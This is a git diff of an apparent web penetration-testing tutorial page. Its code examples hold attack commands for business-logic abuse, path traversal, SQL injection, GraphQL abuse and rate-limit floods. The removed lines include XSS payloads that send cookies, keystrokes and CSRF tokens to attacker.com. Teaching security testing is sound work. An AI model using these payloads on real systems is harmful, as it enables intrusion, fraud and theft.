+                    headers={'Authorization': 'Bearer token123'})
+    print(f'Hour {hour}: Status {r.status_code}')
+"
+
+# GraphQL Authorization Testing
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"query { allUsers { id name email adminNotes } }"}' \
+  https://example.com/graphql
+
+# Mass Assignment Testing
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"name":"test","email":"test@example.com","isAdmin":true,"role":"admin"}' \
+  https://example.com/api/users
+
+# File Access Authorization
+curl -H "Authorization: Bearer user_token" https://example.com/files/admin_only_file.pdf
+curl -H "Authorization: Bearer user_token" https://example.com/uploads/../config/database.xml
+
+# WebSocket Authorization Testing
+python3 -c "
+import websocket
+ws = websocket.WebSocket()
+ws.connect('wss://example.com/ws')
+ws.send('{\"action\":\"admin_command\",\"token\":\"user_token\"}')
+print(ws.recv())
+ws.close()
+"`}
+              />
             </AccordionContent>
           </AccordionItem>
 
           <AccordionItem value="business-logic">
             <AccordionTrigger className="text-lg font-semibold">
-              Business Logic Testing
+              Business Logic & Workflow Security Testing
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Testing Areas</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>Workflow Manipulation:</strong> Step skipping, order changes</li>
-                    <li><strong>Race Conditions:</strong> Concurrent request testing</li>
-                    <li><strong>Input Validation:</strong> Business rule bypass</li>
-                    <li><strong>Economic Logic:</strong> Price manipulation, discounts</li>
-                    <li><strong>Time Manipulation:</strong> Date/time dependent functions</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Business Logic Vulnerability Categories</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">Workflow Manipulation</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Step skipping in multi-step processes</li>
+                        <li>• Process reversal and backward navigation</li>
+                        <li>• Parallel processing exploitation</li>
+                        <li>• State corruption attacks</li>
+                        <li>• Time manipulation in workflows</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Economic Logic Flaws</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Price manipulation attacks</li>
+                        <li>• Quantity bypass (negative values)</li>
+                        <li>• Currency conversion exploitation</li>
+                        <li>• Discount stacking abuse</li>
+                        <li>• Tax calculation bypass</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">Common Scenarios</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>E-commerce:</strong> Cart manipulation, coupon abuse</li>
-                    <li><strong>Banking:</strong> Transaction limits, transfer logic</li>
-                    <li><strong>Gaming:</strong> Score manipulation, item duplication</li>
-                    <li><strong>Social Media:</strong> Privacy bypass, follower manipulation</li>
-                  </ul>
-                </div>
-              </div>
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="api-testing">
-            <AccordionTrigger className="text-lg font-semibold">
-              API Security Testing
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">REST API Testing</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>HTTP Methods:</strong> GET, POST, PUT, DELETE testing</li>
-                    <li><strong>Parameter Pollution:</strong> Multiple parameter handling</li>
-                    <li><strong>Content Type Attacks:</strong> XML, JSON manipulation</li>
-                    <li><strong>Rate Limiting:</strong> DoS prevention testing</li>
-                    <li><strong>CORS Policy:</strong> Cross-origin request testing</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">GraphQL Testing</h5>
-                  <ul className="list-disc pl-6 space-y-1">
-                    <li><strong>Query Complexity:</strong> DoS via complex queries</li>
-                    <li><strong>Introspection:</strong> Schema information disclosure</li>
-                    <li><strong>Injection Attacks:</strong> SQL injection via GraphQL</li>
-                    <li><strong>Authorization:</strong> Field-level access control</li>
-                    <li><strong>Batching Attacks:</strong> Multiple queries exploitation</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Industry-Specific Scenarios</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">E-commerce Testing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Shopping cart manipulation</li>
+                        <li>• Payment process abuse</li>
+                        <li>• Inventory management flaws</li>
+                        <li>• Shipping logic bypass</li>
+                        <li>• Return/refund exploitation</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">Financial Services</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Transaction limit bypass</li>
+                        <li>• Transfer logic manipulation</li>
+                        <li>• Account balance corruption</li>
+                        <li>• Interest calculation flaws</li>
+                        <li>• Regulatory compliance bypass</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
               </div>
               
               <CodeExample
                 language="bash"
-                title="API Testing Examples"
-                code={`# REST API enumeration
-curl -X GET https://api.example.com/v1/users/1
-curl -X GET https://api.example.com/v1/users/2
+                title="Advanced Business Logic Testing Scenarios"
+                code={`# E-commerce Business Logic Testing
+# Price manipulation attacks
+curl -X POST -d "item_id=123&quantity=1&price=0.01" https://shop.example.com/checkout
+curl -X POST -d "item_id=123&quantity=-1&price=100" https://shop.example.com/add-to-cart
 
-# HTTP method testing
-curl -X PUT https://api.example.com/v1/users/1 -d '{"role":"admin"}'
-curl -X DELETE https://api.example.com/v1/users/1
+# Coupon code abuse
+curl -X POST -d "coupon=SAVE50&coupon=SAVE30&coupon=FREESHIP" https://shop.example.com/apply-coupons
+python3 -c "
+import requests
+for i in range(100):
+    requests.post('https://shop.example.com/apply-coupon', 
+                 data={'coupon': 'SAVE50', 'user_id': 123})
+"
 
-# GraphQL introspection
-curl -X POST https://api.example.com/graphql -d '{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}'
+# Inventory manipulation
+curl -X POST -d "item_id=123&quantity=999999" https://shop.example.com/reserve-item
+curl -X POST -d "item_id=123&quantity=1&reserve_time=9999999999" https://shop.example.com/cart
 
-# GraphQL query complexity attack
-curl -X POST https://api.example.com/graphql -d '{"query":"query { user(id:1) { posts { comments { user { posts { comments { text } } } } } } }"}'
+# Race condition in limited offers
+for i in {1..50}; do
+  curl -X POST -d "offer_id=limited_offer_123&user_id=$i" https://shop.example.com/claim-offer &
+done
+wait
 
-# API rate limiting test
-for i in {1..100}; do curl https://api.example.com/v1/data & done`}
+# Multi-step workflow bypass
+# Step 1: Add item to cart
+curl -c cookies.txt -X POST -d "item_id=123" https://shop.example.com/add-to-cart
+# Step 2: Skip payment and go directly to order confirmation
+curl -b cookies.txt https://shop.example.com/order-complete?order_id=12345
+
+# Banking/Financial Logic Testing
+# Transfer limit bypass
+curl -X POST -H "Authorization: Bearer token" \
+  -d "from_account=12345&to_account=67890&amount=1000000" \
+  https://bank.example.com/transfer
+
+# Multiple small transfers to bypass daily limits
+for amount in {1..1000}; do
+  curl -X POST -H "Authorization: Bearer token" \
+    -d "from_account=12345&to_account=67890&amount=$amount" \
+    https://bank.example.com/transfer
+done
+
+# Time-based logic flaws
+# Backdated transactions
+curl -X POST -H "Authorization: Bearer token" \
+  -d "amount=5000&date=2020-01-01T00:00:00Z" \
+  https://bank.example.com/deposit
+
+# Gaming Logic Testing
+# Score manipulation
+curl -X POST -H "Authorization: Bearer token" \
+  -d "score=999999999&game_id=123" \
+  https://game.example.com/submit-score
+
+# Item duplication
+curl -X POST -H "Authorization: Bearer token" \
+  -d "item_id=rare_sword&action=trade&target_user=alt_account" \
+  https://game.example.com/trade &
+curl -X POST -H "Authorization: Bearer token" \
+  -d "item_id=rare_sword&action=sell&price=1000" \
+  https://game.example.com/marketplace &
+
+# Subscription/SaaS Logic Testing
+# Feature access bypass
+curl -H "Authorization: Bearer basic_user_token" \
+  https://saas.example.com/premium/analytics
+
+# Usage limit bypass
+for i in {1..10000}; do
+  curl -H "Authorization: Bearer token" \
+    https://api.example.com/premium-endpoint &
+  if [ $((i % 100)) -eq 0 ]; then echo "Request $i sent"; fi
+done
+
+# Social Media Logic Testing
+# Privacy bypass
+curl -H "Authorization: Bearer user1_token" \
+  https://social.example.com/api/users/private_user/posts
+
+# Follower manipulation
+python3 -c "
+import requests
+import threading
+
+def follow_unfollow():
+    for i in range(1000):
+        requests.post('https://social.example.com/follow', 
+                     data={'target_user': 'celebrity123'},
+                     headers={'Authorization': 'Bearer token'})
+        requests.post('https://social.example.com/unfollow', 
+                     data={'target_user': 'celebrity123'},
+                     headers={'Authorization': 'Bearer token'})
+
+for _ in range(10):
+    threading.Thread(target=follow_unfollow).start()
+"
+
+# Voting/Rating System Manipulation
+# Multiple votes from same user
+curl -X POST -H "Authorization: Bearer token" \
+  -d "rating=5&product_id=123" \
+  https://review.example.com/submit-rating
+# Clear cookies/session and vote again
+curl -X POST -d "rating=5&product_id=123" \
+  https://review.example.com/submit-rating
+
+# File sharing logic flaws
+# Access control bypass via direct link
+curl https://files.example.com/download/private_file_xyz.pdf
+# Share link manipulation
+curl https://files.example.com/share/public_link_123?file=../../../private/confidential.pdf
+
+# Booking/Reservation System Testing
+# Double booking
+curl -X POST -d "room_id=101&date=2024-01-01&user_id=123" \
+  https://hotel.example.com/book &
+curl -X POST -d "room_id=101&date=2024-01-01&user_id=456" \
+  https://hotel.example.com/book &
+
+# Time zone manipulation
+curl -X POST -d "resource_id=conference_room&start_time=2024-01-01T14:00:00Z&timezone=UTC" \
+  https://booking.example.com/reserve
+curl -X POST -d "resource_id=conference_room&start_time=2024-01-01T14:00:00-08:00&timezone=PST" \
+  https://booking.example.com/reserve
+
+# Multi-tenant logic testing
+# Cross-tenant data access
+curl -H "Authorization: Bearer tenant1_token" \
+  -H "X-Tenant-ID: tenant2" \
+  https://saas.example.com/api/data
+
+# Loyalty program manipulation
+# Points accumulation bypass
+curl -X POST -H "Authorization: Bearer token" \
+  -d "action=purchase&amount=1000000&points_multiplier=100" \
+  https://loyalty.example.com/earn-points`}
               />
             </AccordionContent>
           </AccordionItem>
-        </Accordion>
-      </div>
 
-      {/* Exploitation Techniques */}
-      <div className="card">
-        <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
-          <Zap className="h-7 w-7 text-cybr-primary" />
-          Advanced Exploitation Techniques
-        </h3>
-        
-        <Accordion type="single" collapsible className="space-y-4">
-          <AccordionItem value="payload-crafting">
+          <AccordionItem value="api-security-testing">
             <AccordionTrigger className="text-lg font-semibold">
-              Payload Crafting Strategies
+              API Security Testing & Modern Web Technologies
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">XSS Payload Categories</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>Alert Boxes:</strong> Basic proof of concept</li>
-                    <li><strong>Cookie Theft:</strong> Session hijacking payloads</li>
-                    <li><strong>Keyloggers:</strong> Input capture scripts</li>
-                    <li><strong>Page Defacement:</strong> Visual manipulation</li>
-                    <li><strong>Redirection:</strong> Phishing attacks</li>
-                    <li><strong>CSRF Tokens:</strong> Anti-CSRF bypass</li>
-                    <li><strong>BeEF Hooks:</strong> Browser exploitation</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">REST API Security Testing</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-blue-900/20 border border-blue-500 rounded">
+                      <h6 className="font-semibold text-blue-400 mb-2">HTTP Method Testing</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• GET, POST, PUT, DELETE, PATCH verification</li>
+                        <li>• OPTIONS method information disclosure</li>
+                        <li>• HTTP method override attacks</li>
+                        <li>• Verb tampering for access control bypass</li>
+                        <li>• Custom HTTP methods exploration</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-green-900/20 border border-green-500 rounded">
+                      <h6 className="font-semibold text-green-400 mb-2">Parameter Manipulation</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Query parameter pollution attacks</li>
+                        <li>• Path parameter injection</li>
+                        <li>• Header parameter manipulation</li>
+                        <li>• Content-Type confusion attacks</li>
+                        <li>• API versioning bypass techniques</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">SQL Injection Techniques</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>UNION-based:</strong> Data extraction via UNION</li>
-                    <li><strong>Boolean-based:</strong> True/false response analysis</li>
-                    <li><strong>Time-based:</strong> Blind injection with delays</li>
-                    <li><strong>Error-based:</strong> Information through error messages</li>
-                    <li><strong>Stacked Queries:</strong> Multiple statement execution</li>
-                    <li><strong>Second-order:</strong> Stored payload execution</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">GraphQL Security Assessment</h5>
+                  <div className="space-y-3">
+                    <div className="p-3 bg-purple-900/20 border border-purple-500 rounded">
+                      <h6 className="font-semibold text-purple-400 mb-2">Query Complexity Attacks</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Deeply nested query attacks</li>
+                        <li>• Circular reference exploitation</li>
+                        <li>• Resource exhaustion via complex queries</li>
+                        <li>• Batch query abuse</li>
+                        <li>• Query cost analysis bypass</li>
+                      </ul>
+                    </div>
+                    
+                    <div className="p-3 bg-orange-900/20 border border-orange-500 rounded">
+                      <h6 className="font-semibold text-orange-400 mb-2">Information Disclosure</h6>
+                      <ul className="text-sm space-y-1">
+                        <li>• Introspection query abuse</li>
+                        <li>• Schema information extraction</li>
+                        <li>• Error message information leakage</li>
+                        <li>• Field-level authorization bypass</li>
+                        <li>• Debug mode exploitation</li>
+                      </ul>
+                    </div>
+                  </div>
                 </div>
               </div>
               
               <CodeExample
-                language="javascript"
-                title="Advanced XSS Payloads"
-                code={`// Cookie theft payload
-<script>
-document.location='http://attacker.com/steal.php?cookie='+document.cookie
-</script>
+                language="bash"
+                title="Comprehensive API Security Testing"
+                code={`# REST API Comprehensive Testing
+# HTTP Method Enumeration
+for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
+  echo "Testing $method method:"
+  curl -X $method -i https://api.example.com/users/123
+done
 
-// Keylogger payload
-<script>
-document.addEventListener('keypress', function(e) {
-    fetch('http://attacker.com/log.php?key=' + e.key);
-});
-</script>
+# API Endpoint Discovery
+ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
+  -u https://api.example.com/v1/FUZZ -mc 200,400,401,403,500
 
-// CSRF token extraction
-<script>
-fetch('/api/user/profile')
-.then(response => response.text())
-.then(data => {
-    const token = data.match(/csrf_token.*?value="([^"]+)"/)[1];
-    fetch('http://attacker.com/csrf.php?token=' + token);
-});
-</script>
+# Parameter Pollution Testing
+curl "https://api.example.com/search?category=books&category=electronics&sort=price"
+curl -X POST -d "user_id=123&user_id=456&action=delete" https://api.example.com/users
 
-// DOM-based XSS
-<script>
-const params = new URLSearchParams(window.location.search);
-document.getElementById('content').innerHTML = params.get('message');
-</script>
+# Content-Type Confusion
+curl -X POST -H "Content-Type: application/json" \
+  -d "username=admin&password=password" https://api.example.com/login
+curl -X POST -H "Content-Type: application/xml" \
+  -d "<login><username>admin</username><password>password</password></login>" \
+  https://api.example.com/login
 
-// Filter bypass techniques
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-<iframe srcdoc="<script>alert(1)</script>">
-<details open ontoggle=alert(1)>`}
+# API Version Testing
+for version in v1 v2 v3 beta alpha; do
+  curl https://api.example.com/$version/users/profile
+done
+
+# Rate Limiting Testing
+python3 -c "
+import requests
+import threading
+import time
+
+def api_request():
+    for i in range(1000):
+        r = requests.get('https://api.example.com/data', 
+                       headers={'Authorization': 'Bearer token123'})
+        if r.status_code == 429:
+            print(f'Rate limited at request {i}')
+            break
+        time.sleep(0.01)
+
+for _ in range(10):
+    threading.Thread(target=api_request).start()
+"
+
+# CORS Policy Testing
+curl -H "Origin: https://attacker.com" \
+  -H "Access-Control-Request-Method: POST" \
+  -H "Access-Control-Request-Headers: Authorization" \
+  -X OPTIONS https://api.example.com/sensitive
+
+# JWT API Testing
+python3 jwt_tool.py -t https://api.example.com/profile \
+  -rh "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
+
+# GraphQL Security Testing
+# Introspection Query
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}' \
+  https://api.example.com/graphql
+
+# Query Complexity Attack
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"query { user(id: \"1\") { posts { comments { author { posts { comments { author { posts { comments { text } } } } } } } } } }"}' \
+  https://api.example.com/graphql
+
+# Batch Query Attack
+curl -X POST -H "Content-Type: application/json" \
+  -d '[{"query":"query { user(id: \"1\") { name } }"},{"query":"query { user(id: \"2\") { name } }"},{"query":"query { user(id: \"3\") { name } }"}]' \
+  https://api.example.com/graphql
+
+# GraphQL Injection Testing
+curl -X POST -H "Content-Type: application/json" \
+  -d '{"query":"query { user(id: \"1\" OR \"1\"=\"1\") { name email } }"}' \
+  https://api.example.com/graphql
+
+# WebSocket API Testing
+python3 -c "
+import websocket
+import json
+
+def on_message(ws, message):
+    print(f'Received: {message}')
+
+def on_error(ws, error):
+    print(f'Error: {error}')
+
+def on_close(ws):
+    print('Connection closed')
+
+def on_open(ws):
+    # Test authentication bypass
+    ws.send(json.dumps({'action': 'authenticate', 'token': 'invalid_token'}))
+    # Test admin commands
+    ws.send(json.dumps({'action': 'admin_command', 'command': 'list_users'}))
+    # Test injection
+    ws.send(json.dumps({'action': 'search', 'query': '\'; DROP TABLE users;--'}))
+
+ws = websocket.WebSocketApp('wss://api.example.com/ws',
+                          on_message=on_message,
+                          on_error=on_error,
+                          on_close=on_close)
+ws.on_open = on_open
+ws.run_forever()
+"
+
+# gRPC API Testing
+# Generate protobuf definitions
+grpcurl -plaintext api.example.com:9090 list
+grpcurl -plaintext api.example.com:9090 describe UserService
+grpcurl -plaintext -d '{"user_id": "123"}' api.example.com:9090 UserService/GetUser
+
+# SOAP API Testing
+curl -X POST -H "Content-Type: text/xml; charset=utf-8" \
+  -H "SOAPAction: getUserInfo" \
+  -d '<?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <getUserInfo>
+            <userId>123</userId>
+          </getUserInfo>
+        </soap:Body>
+      </soap:Envelope>' \
+  https://api.example.com/soap
+
+# API Documentation Testing
+# Swagger/OpenAPI endpoint discovery
+curl https://api.example.com/swagger.json
+curl https://api.example.com/api-docs
+curl https://api.example.com/openapi.json
+curl https://api.example.com/docs
+
+# Mobile API Testing
+# iOS User-Agent
+curl -H "User-Agent: MyApp/1.0 (iPhone; iOS 15.0; Scale/3.00)" \
+  https://api.example.com/mobile/data
+
+# Android User-Agent
+curl -H "User-Agent: MyApp/1.0 (Linux; Android 12; SM-G991B)" \
+  https://api.example.com/mobile/data
+
+# API Key Testing
+api_keys=("test" "admin" "debug" "api_key" "12345" "key123")
+for key in "${api_keys[@]}"; do
+  curl -H "X-API-Key: $key" https://api.example.com/data
+  curl -H "Authorization: API-Key $key" https://api.example.com/data
+done
+
+# Server-Sent Events (SSE) Testing
+curl -N -H "Accept: text/event-stream" https://api.example.com/events
+
+# API Fuzzing with Custom Payloads
+python3 -c "
+import requests
+import json
+
+payloads = [
+    {'test': '../../../etc/passwd'},
+    {'test': '<script>alert(1)</script>'},
+    {'test': '\'; DROP TABLE users;--'},
+    {'test': '{{7*7}}'},
+    {'test': '\${7*7}'},
+    {'test': 'A' * 10000}
+]
+
+for payload in payloads:
+    try:
+        r = requests.post('https://api.example.com/process', 
+                         json=payload, timeout=5)
+        if r.status_code != 400:
+            print(f'Potential vulnerability with payload: {payload}')
+            print(f'Response: {r.text[:200]}')
+    except:
+        pass
+"`}
               />
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="vulnerability-chaining">
-            <AccordionTrigger className="text-lg font-semibold">
-              Vulnerability Chaining
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">Common Chains</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>CSRF + XSS:</strong> Cross-site request forgery via XSS</li>
-                    <li><strong>IDOR + Information Disclosure:</strong> Data access escalation</li>
-                    <li><strong>XXE + SSRF:</strong> Internal network access</li>
-                    <li><strong>File Upload + Path Traversal:</strong> Arbitrary file write</li>
-                    <li><strong>SQLi + File Write:</strong> Web shell deployment</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Attack Scenarios</h5>
-                  <ul className="list-disc pl-6 space-y-2">
-                    <li><strong>Account Takeover:</strong> Multi-step user compromise</li>
-                    <li><strong>Privilege Escalation:</strong> User to admin access</li>
-                    <li><strong>Data Exfiltration:</strong> Systematic data theft</li>
-                    <li><strong>Persistent Access:</strong> Backdoor establishment</li>
-                  </ul>
-                </div>
-              </div>
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="privilege-escalation">
-            <AccordionTrigger className="text-lg font-semibold">
-              Privilege Escalation Methods
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">Horizontal Escalation</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>IDOR attacks</li>
-                    <li>Session token manipulation</li>
-                    <li>Parameter tampering</li>
-                    <li>Forced browsing</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Vertical Escalation</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>Role manipulation</li>
-                    <li>Function bypass</li>
-                    <li>Administrative interface access</li>
-                    <li>Privilege bit flipping</li>
-                  </ul>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Environment-Specific</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li>Container escape</li>
-                    <li>Cloud metadata access</li>
-                    <li>Serverless function abuse</li>
-                    <li>Microservice traversal</li>
-                  </ul>
-                </div>
-              </div>
             </AccordionContent>
           </AccordionItem>
         </Accordion>
       </div>
 
-      {/* Methodology Frameworks */}
+      {/* Professional Methodologies */}
       <div className="card">
         <h3 className="text-2xl font-bold mb-6 flex items-center gap-2">
           <BookOpen className="h-7 w-7 text-cybr-primary" />
-          Professional Testing Methodologies
+          Professional Testing Methodologies & Frameworks
         </h3>
         
         <Accordion type="single" collapsible className="space-y-4">
-          <AccordionItem value="owasp-guide">
+          <AccordionItem value="owasp-comprehensive">
             <AccordionTrigger className="text-lg font-semibold">
-              OWASP Web Security Testing Guide (WSTG)
+              OWASP Web Security Testing Guide (WSTG) - Complete Implementation
             </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <AccordionContent className="space-y-6">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                 <div>
-                  <h5 className="font-semibold mb-3">Testing Categories</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>WSTG-INFO:</strong> Information Gathering</li>
-                    <li><strong>WSTG-CONF:</strong> Configuration and Deployment Management</li>
-                    <li><strong>WSTG-IDNT:</strong> Identity Management</li>
-                    <li><strong>WSTG-ATHN:</strong> Authentication</li>
-                    <li><strong>WSTG-AUTHZ:</strong> Authorization</li>
-                    <li><strong>WSTG-SESS:</strong> Session Management</li>
-                    <li><strong>WSTG-INPV:</strong> Input Validation</li>
-                    <li><strong>WSTG-ERRH:</strong> Error Handling</li>
-                    <li><strong>WSTG-CRYP:</strong> Cryptography</li>
-                    <li><strong>WSTG-BUSLOGIC:</strong> Business Logic</li>
-                    <li><strong>WSTG-CLIENT:</strong> Client-side Testing</li>
-                    <li><strong>WSTG-APIT:</strong> API Testing</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">WSTG Testing Categories (Complete)</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-blue-900/20 border border-blue-500 rounded text-sm">
+                      <strong className="text-blue-400">WSTG-INFO:</strong> Information Gathering (10 tests)
+                    </div>
+                    <div className="p-2 bg-green-900/20 border border-green-500 rounded text-sm">
+                      <strong className="text-green-400">WSTG-CONF:</strong> Configuration Management (11 tests)
+                    </div>
+                    <div className="p-2 bg-yellow-900/20 border border-yellow-500 rounded text-sm">
+                      <strong className="text-yellow-400">WSTG-IDNT:</strong> Identity Management (5 tests)
+                    </div>
+                    <div className="p-2 bg-purple-900/20 border border-purple-500 rounded text-sm">
+                      <strong className="text-purple-400">WSTG-ATHN:</strong> Authentication (10 tests)
+                    </div>
+                    <div className="p-2 bg-red-900/20 border border-red-500 rounded text-sm">
+                      <strong className="text-red-400">WSTG-AUTHZ:</strong> Authorization (4 tests)
+                    </div>
+                    <div className="p-2 bg-orange-900/20 border border-orange-500 rounded text-sm">
+                      <strong className="text-orange-400">WSTG-SESS:</strong> Session Management (9 tests)
+                    </div>
+                  </div>
                 </div>
+                
                 <div>
-                  <h5 className="font-semibold mb-3">OWASP Top 10 Mapping</h5>
-                  <ul className="list-disc pl-6 space-y-1 text-sm">
-                    <li><strong>A01:2021:</strong> Broken Access Control</li>
-                    <li><strong>A02:2021:</strong> Cryptographic Failures</li>
-                    <li><strong>A03:2021:</strong> Injection</li>
-                    <li><strong>A04:2021:</strong> Insecure Design</li>
-                    <li><strong>A05:2021:</strong> Security Misconfiguration</li>
-                    <li><strong>A06:2021:</strong> Vulnerable Components</li>
-                    <li><strong>A07:2021:</strong> Identification & Authentication</li>
-                    <li><strong>A08:2021:</strong> Software & Data Integrity</li>
-                    <li><strong>A09:2021:</strong> Security Logging</li>
-                    <li><strong>A10:2021:</strong> Server-Side Request Forgery</li>
-                  </ul>
+                  <h5 className="font-semibold mb-3 text-cybr-primary">Additional WSTG Categories</h5>
+                  <div className="space-y-2">
+                    <div className="p-2 bg-cyan-900/20 border border-cyan-500 rounded text-sm">
+                      <strong className="text-cyan-400">WSTG-INPV:</strong> Input Validation (20 tests)
+                    </div>
+                    <div className="p-2 bg-pink-900/20 border border-pink-500 rounded text-sm">
+                      <strong className="text-pink-400">WSTG-ERRH:</strong> Error Handling (2 tests)
+                    </div>
+                    <div className="p-2 bg-lime-900/20 border border-lime-500 rounded text-sm">
+                      <strong className="text-lime-400">WSTG-CRYP:</strong> Cryptography (4 tests)
+                    </div>
+                    <div className="p-2 bg-violet-900/20 border border-violet-500 rounded text-sm">
+                      <strong className="text-violet-400">WSTG-BUSLOGIC:</strong> Business Logic (9 tests)
+                    </div>
+                    <div className="p-2 bg-rose-900/20 border border-rose-500 rounded text-sm">
+                      <strong className="text-rose-400">WSTG-CLIENT:</strong> Client-side Testing (13 tests)
+                    </div>
+                    <div className="p-2 bg-amber-900/20 border border-amber-500 rounded text-sm">
+                      <strong className="text-amber-400">WSTG-APIT:</strong> API Testing (9 tests)
+                    </div>
+                  </div>
                 </div>
               </div>
-            </AccordionContent>
-          </AccordionItem>
-
-          <AccordionItem value="ptes">
-            <AccordionTrigger className="text-lg font-semibold">
-              PTES (Penetration Testing Execution Standard)
-            </AccordionTrigger>
-            <AccordionContent className="space-y-4">
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <h5 className="font-semibold mb-3">PTES Phases</h5>
-                  <ol className="list-decimal pl-6 space-y-2">
-                    <li><strong>Pre-engagement Interactions:</strong> Scope definition, legal agreements</li>
-                    <li><strong>Intelligence Gathering:</strong> OSINT, reconnaissance</li>
-                    <li><strong>Threat Modeling:</strong> Attack vector identification</li>
-                    <li><strong>Vulnerability Analysis:</strong> Security flaw identification</li>
-                    <li><strong>Exploitation:</strong> Vulnerability confirmation</li>
-                    <li><strong>Post Exploitation:</strong> Impact assessment</li>
-                    <li><strong>Reporting:</strong> Findings documentation</li>
-                  </ol>
-                </div>
-                <div>
-                  <h5 className="font-semibold mb-3">Risk Rating Framework</h5>
+              
+              <div className="mt-6">
+                <h5 className="font-semibold mb-3 text-cybr-primary">OWASP Top 10 2021 Mapping</h5>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div className="space-y-2">
-                    <div className="p-2 bg-red-900/20 border border-red-500 rounded">
-                      <strong className="text-red-400">Critical:</strong> Immediate threat to business
